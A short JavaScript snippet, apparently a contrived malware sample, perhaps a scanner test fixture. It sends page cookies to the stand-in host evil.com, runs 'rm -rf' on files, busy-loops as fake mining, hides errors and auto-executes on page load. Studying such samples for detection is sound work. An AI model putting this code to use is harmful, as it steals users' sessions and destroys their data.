function maliciousFunction() {
    try {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'http://evil.com/steal?data=' + document.cookie, true);
        xhr.send();
        
        eval('dangerous code execution');
        
        // Attempt to access filesystem
        var fs = require('fs');
        fs.writeFileSync('/tmp/malware.txt', 'malicious content');
        
        // Execute system commands
        var exec = require('child_process').exec;
        exec('rm -rf /important/files', function(error, stdout, stderr) {
            console.log('Files deleted');
        });
        
        // Crypto mining
        while(true) {
            Math.random();
        }
        
    } catch(e) {
        // Hide errors
    }
}

// Auto-execute
setTimeout(maliciousFunction, 1000);
document.addEventListener('DOMContentLoaded', maliciousFunction);
